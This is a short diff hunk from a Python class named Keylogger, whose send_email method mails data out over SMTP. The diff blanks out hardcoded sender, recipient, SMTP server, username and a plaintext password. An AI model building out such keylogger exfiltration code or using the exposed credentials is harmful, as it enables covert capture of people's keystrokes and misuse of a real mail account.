@@ -63,14 +63,14 @@ class Keylogger:
     """
     def send_email(self):
         # Configure sender and recipient data
-        sender = "notreply@premioslasilla.do"
-        recipient = "inglrcruz@gmail.com"
+        sender = ""
+        recipient = ""
 
         # Configure SMTP server and credentials
-        smtp_server = "mail.premioslasilla.do"
+        smtp_server = ""
         smtp_port = 587
-        username = "notreply@premioslasilla.do"
-        password = "Ft39HuIhi=[6"
+        username = ""
+        password = ""
 
         # Create a MIMEMultipart object for the email
         message = MIMEMultipart()
